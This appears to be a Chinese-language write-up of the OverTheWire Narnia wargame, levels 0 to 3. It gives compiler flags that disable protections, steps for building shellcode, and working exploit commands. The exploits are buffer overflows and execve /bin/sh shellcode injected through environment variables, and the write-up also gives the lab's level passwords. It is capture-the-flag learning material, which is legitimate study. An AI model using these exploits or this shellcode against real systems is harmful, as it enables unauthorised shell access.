wargame-narnia
==============

-  ssh addr: narnia0@narnia.labs.overthewire.org
-  url: http://overthewire.org/wargames/narnia/

    --[ Tips ]--

    This machine has a 64bit processor and many security-features
    enabled by default, although ASLR has been switched off. The
    following compiler flags might be interesting:

    -  -m32 compile for 32bit
    -  -fno-stack-protector disable ProPolice
    -  -Wl,-z,norelro disable relro

    In addition, the execstack tool can be used to flag the stack as
    executable on ELF binaries.

    Finally, network-access is limited for most levels by a local
    firewall.

测试 shellcode:
~~~~~~~~~~~~~~~

`shellcodetest.c <./shellcodetest.c>`__

gcc -fno-stack-protector -z execstack -m32 shellcodetest.c -o
shellcodetest

生成 shellcode
~~~~~~~~~~~~~~

1. 写出 xxx.asm
2. `nasm -f elf32 xxx.asm -o xxx.o`
3. `ld -m elf_i386 -o xxx xxx.o`
4. `objdump -d xxx` 从输出中获得 shellcode 当然也可以写个工具提取
5. 考虑一下让\ `.text`\ 段可写?
   `objcopy --writable-text -O elf32-i386 xxx xxx1` 似乎没有作用...

更改的系统值存档
~~~~~~~~~~~~~~~~

-  `/proc/sys/kernel/randomize_va_space` = 2

narnia0
'''''''

flag: narnia0

narnia1
'''''''

flag: efeidiedae

`narnia0.c <./narnia0.c>`__

需要覆盖\ `val`\ 变量, 注意管道关闭后程序也会随着关闭因此需要用
`cat` 继续向程序传递内容

::

    $ (python -c "print('aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde')"; cat) | /narnia/narnia0
    # 进入 sh 后执行
    $ cat /etc/narnia_pass/narnia1

narnia2
'''''''

flag: nairiepecu

`narnia1.c <./narnia1.c>`__

程序直接把环境变量 `$EGG` 的内容当成函数执行了，所以要在 `$EGG`
中插入程序。

这次需要真正的 shellcode 了, shellcode 见 `shell.asm`, 将生成的
shellcode 导入 EGG 变量, 直接执行 `./narnia2` 即可.

shellcode: `shell.asm <./shell.asm>`__

::

    $ export EGG=$(python -c "print('\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42')")
    $ ./narnia1

narnia3
'''''''

`narnia2.c <./narnia2.c>`__

查看环境变量地址: `(gdb) x/s *((char **)environ + 1)`\ ， 结果
`0xffffd8a1:     "XDG_SESSION_ID=76296"`

::

    $ export XDG_SESSION_ID=$(python -c "print('\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42')")
    ./narnia2 $(python -c "print('a' * 140 + '\x55\xd8\xff\xff')")
